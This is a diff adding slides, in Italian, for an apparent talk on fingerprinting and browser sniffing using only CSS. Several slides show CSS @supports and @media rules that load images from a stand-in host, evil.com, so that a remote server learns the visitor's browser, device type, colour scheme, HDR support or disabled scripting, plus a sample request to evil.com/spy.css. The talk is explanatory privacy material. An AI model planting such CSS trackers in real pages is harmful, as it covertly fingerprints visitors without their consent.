@@ -1,0 +1,166 @@
+<p-slide>
+  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
+</p-slide>
+<p-slide class="center">
+  <h3>Parliamo di</h3>
+  <img src="img/fingerprint.svg" alt="Fingerprinting" style="height: 6em;">
+</p-slide>
+<p-slide class="center">
+  <h1>CSS</h1>
+  <h3>
+    <p-fragment>può fare richieste <em>non limitate</em> a suo piacimento</p-fragment>
+  </h3>
+</p-slide>
+<p-slide>
+  <img src="img/deal-with-it.gif" alt="Arrangiatevi" class="full-media">
+</p-slide>
+<p-slide class="justify-end">
+  <video src="img/break-the-internet.mp4" class="full-media" autoplay loop muted></video>
+  <h2 class="center uppercase meme-text">Si rompe l'internet</h2>
+</p-slide>
+<p-slide>
+  <pre class="self-center" style="font-size: 50%;">IP: 123.123.123.123
+
+GET http://evil.com/spy.css HTTP/1.1
+<b>Accept</b>: text/css,*/*;q=0.1
+<b>Accept-Encoding</b>: gzip, deflate, br
+<b>Accept-Language</b>: it-IT,it;q=0.9,en-XA;q=0.8,en;q=0.7,en-US;q=0.6
+<b>Cache-Control</b>: no-cache
+<b>DNT</b>: 1
+<b>Pragma</b>: no-cache
+<b>Host</b>: https://hello.com
+<b>User-agent</b>: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+  AppleWebKit/537.36 (KHTML, like Gecko)
+  Chrome/98.0.4758.102 Safari/537.36</pre>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;top: 14%;left: 37%;transform: rotate(-35deg);"></div>
+    <div style="position: absolute; top: 16%; left: 53%;">🌎</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;top: 30%;left: 60%;transform: rotate(-50deg);"></div>
+    <div style="position: absolute; top: 27%; left: 75%;">🌍</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;transform: rotate(-10deg);left: 65%;top: 70%;"></div>
+    <div style="position: absolute;top: 80%;left: 80%;">🏄‍♀️</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 1.5em;transform: scale(-1, 1);top: 54%;left: 8%;"></div>
+    <div style="position: absolute;top: 60%;left: 3%;">🤣</div>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h1 class="center">Browser sniffing</h1>
+  <p-fragment>
+    <h3 class="center">feat. CSS</h3>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header"><code>@supports</code></h3>
+  <p-fragment class="self-center">
+    <pre class="big language-css"><code>@supports (accent-color: red) {
+  .browser-sniff {
+    background-image: url(ch-93-ff-92-sf-15.4.png)
+  }
+}</code></pre>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3em;transform: scale(-1, 1);top: 30%;left: 38%;"></div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3em;transform: scale(1, -1);top: 65%;left: 58%;"></div>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <table class="center">
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;"><code>@supports</code></th>
+        <th style="border-bottom: .1em solid; padding: .5em;">Browser/OS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><p-fragment><code>-webkit-app-region</code></p-fragment></td>
+        <td><p-fragment><img src="img/chrome.svg" alt="Chrome" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-apple-pay-button-style</code></p-fragment></td>
+        <td><p-fragment><img src="img/safari.svg" alt="Safari" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-webkit-touch-callout</code></p-fragment></td>
+        <td><p-fragment><img src="img/safari.svg" alt="Safari" style="height: 1.5em"><img src="img/iphone.svg" alt="Mobile" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-moz-appearance</code></p-fragment></td>
+        <td><p-fragment><img src="img/firefox.svg" alt="Firefox" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-moz-osx-font-smoothing</code></p-fragment></td>
+        <td><p-fragment><img src="img/firefox.svg" alt="Firefox" style="height: 1.5em"><img src="img/apple.svg" alt="Apple" style="height: 1.5em"></p-fragment></td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <img src="img/web-compat-caniuse.png" alt="Tabella di compatibilità da Can I Use">
+    <img src="img/web-compat-mdn.png" alt="Tabella di compatibilità da MDN">
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h1>Non pensiate</h1>
+  <p-fragment>che i browser più vecchi <em>non siano interessanti</em></p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header"><code>@media</code> queries</h3>
+  <p-fragment class="self-center">
+    <pre class="language-css big"><code>@media (max-width: 459px) {
+  .device-sniff {
+    background-image: url(//evil.com/mobile.png);
+  }
+}
+@media (min-width: 460px) and (max-width: 999px) {
+...</code></pre>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <video src="img/jenga-fail.mp4" class="full-media" autoplay muted loop></video>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (pointer: coarse) {
+  .device-sniff {
+    background-image: url(//evil.com/mobile.png);
+  }}
+@media (pointer: fine) {
+  .device-sniff {
+    background-image: url(//evil.com/desktop.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">📱</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">💻</div></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (prefers-color-scheme: dark) {
+  .device-sniff {
+    background-image: url(//evil.com/nerd.png);
+  }}
+@media (color-gamut: p3) {
+  .device-sniff {
+    background-image: url(//evil.com/apple.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🤓</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🍎</div></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (dynamic-range: high) {
+  .device-sniff {
+    background-image: url(//evil.com/hdr.png);
+  }}
+@media (scripting: none) {
+  .device-sniff {
+    background-image: url(//evil.com/no-js.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">💸</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">❌</div></p-fragment>
+</p-slide>
